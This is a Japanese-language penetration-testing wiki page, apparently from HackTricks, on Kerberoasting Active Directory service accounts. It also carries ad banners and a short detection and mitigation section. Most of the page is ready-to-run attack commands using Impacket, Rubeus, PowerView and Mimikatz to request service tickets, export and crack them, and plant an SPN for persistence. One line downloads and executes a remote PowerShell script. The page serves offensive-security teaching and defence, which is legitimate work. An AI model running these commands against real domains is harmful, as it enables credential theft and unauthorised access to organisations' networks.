# Kerberoast

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフロー**を簡単に構築し、**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoastingは、**Active Directory (AD)**内の**ユーザーアカウント**に関連するサービスに特に関係する**TGSチケット**の取得に焦点を当てています。**コンピューターアカウント**は除外されます。これらのチケットの暗号化は、**ユーザーパスワード**から派生したキーを利用しており、**オフラインの資格情報クラッキング**の可能性を許可します。サービスとしてのユーザーアカウントの使用は、非空の**"ServicePrincipalName"**プロパティによって示されます。

**Kerberoasting**を実行するには、**TGSチケット**を要求できるドメインアカウントが必要ですが、このプロセスは**特別な権限**を要求せず、**有効なドメイン資格情報**を持つ誰でもアクセス可能です。

### 主なポイント：

- **Kerberoasting**は、**AD**内の**ユーザーアカウントサービス**のための**TGSチケット**をターゲットにします。
- **ユーザーパスワード**からのキーで暗号化されたチケットは**オフラインでクラッキング**可能です。
- サービスは、nullでない**ServicePrincipalName**によって識別されます。
- **特別な権限**は必要なく、**有効なドメイン資格情報**だけが必要です。

### **攻撃**

> [!WARNING]
> **Kerberoastingツール**は、攻撃を実行しTGS-REQリクエストを開始する際に通常**`RC4暗号化`**を要求します。これは、**RC4が** [**より弱い**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795)ため、Hashcatなどのツールを使用して他の暗号化アルゴリズム（AES-128やAES-256など）よりもオフラインでクラッキングしやすいからです。\
> RC4（タイプ23）ハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。`.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
kerberoastableユーザーのダンプを含むマルチ機能ツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Kerberoastableユーザーを列挙する**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **テクニック 1: TGSを要求し、メモリからダンプする**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **技術 2: 自動ツール**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> TGSが要求されると、Windowsイベント `4769 - A Kerberos service ticket was requested` が生成されます。

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) を使用して、世界で最も**高度な**コミュニティツールによって駆動される**ワークフローを簡単に構築し、**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### クラッキング
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

ユーザーに対して**十分な権限**があれば、そのユーザーを**kerberoastable**にすることができます：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
有用な**ツール**はここで見つけることができます: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Linuxからこの**エラー**が表示された場合: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** は、ローカル時間が原因です。ホストをDCと同期させる必要があります。いくつかのオプションがあります:

- `ntpdate <IP of DC>` - Ubuntu 16.04以降は非推奨
- `rdate -n <IP of DC>`

### 緩和策

Kerberoastingは、悪用可能な場合、高度な隠密性で実施できます。この活動を検出するためには、**Security Event ID 4769**に注意を払う必要があります。これは、Kerberosチケットが要求されたことを示します。しかし、このイベントの頻度が高いため、疑わしい活動を特定するために特定のフィルターを適用する必要があります:

- サービス名は**krbtgt**であってはならず、これは通常のリクエストです。
- **$**で終わるサービス名は、サービスに使用されるマシンアカウントを含まないように除外する必要があります。
- マシンからのリクエストは、**machine@domain**形式のアカウント名を除外することでフィルタリングする必要があります。
- 成功したチケットリクエストのみを考慮し、失敗コード**'0x0'**で識別します。
- **最も重要なこと**は、チケットの暗号化タイプが**0x17**である必要があり、これはKerberoasting攻撃でよく使用されます。
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoastingのリスクを軽減するために：

- **サービスアカウントのパスワードは推測しにくいものにする**ことを確認し、**25文字以上**の長さを推奨します。
- **マネージドサービスアカウント**を利用し、**自動パスワード変更**や**委任されたサービスプリンシパル名（SPN）管理**などの利点を提供し、こうした攻撃に対するセキュリティを強化します。

これらの対策を実施することで、組織はKerberoastingに関連するリスクを大幅に低減できます。

## ドメインアカウントなしのKerberoast

**2022年9月**、チャーリー・クラークという研究者によって新しいシステムの悪用方法が明らかにされ、彼のプラットフォーム[exploit.ph](https://exploit.ph/)を通じて共有されました。この方法では、**KRB_AS_REQ**リクエストを介して**サービスチケット（ST）**を取得することが可能で、驚くべきことに、Active Directoryアカウントの制御を必要としません。基本的に、プリンシパルが事前認証を必要としないように設定されている場合—サイバーセキュリティの領域で**AS-REP Roasting攻撃**として知られるシナリオに似ています—この特性を利用してリクエストプロセスを操作できます。具体的には、リクエストのボディ内の**sname**属性を変更することで、システムは標準の暗号化されたチケットグラントチケット（TGT）ではなく、**ST**を発行するように欺かれます。

この技術については、この記事で詳しく説明されています：[Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

> [!WARNING]
> この技術を使用してLDAPをクエリするための有効なアカウントがないため、ユーザーのリストを提供する必要があります。

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## 参考文献

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
今すぐアクセスを取得： 

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
